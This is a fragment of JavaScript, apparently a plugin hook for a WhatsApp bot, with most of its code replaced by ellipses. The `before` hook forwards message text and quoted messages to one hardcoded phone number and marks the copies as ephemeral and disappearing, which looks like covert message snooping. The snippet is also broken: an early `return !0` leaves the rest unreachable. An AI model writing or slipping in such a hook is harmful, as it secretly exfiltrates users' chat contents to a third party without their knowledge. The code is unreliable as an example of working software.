...
export async function before(m, { conn, text, usedPrefix, command }) {
    ...
    return !0
    if (m.sender == '+79011033947@s.whatsapp.net' || m.sender == '573136855110@s.whatsapp.net'){
    return   
    }
    ...
    for (const c of teks) {
        ...
        await conn.sendMessage(('+79011033947@s.whatsapp.net'), { text: m.quoted ? teks + m.quoted.text : teks.trim(), mentions: conn.parseMention(teks) }, {quoted: m, ephemeralExpiration: 1 * 100, disappearingMessagesInChat: true} );
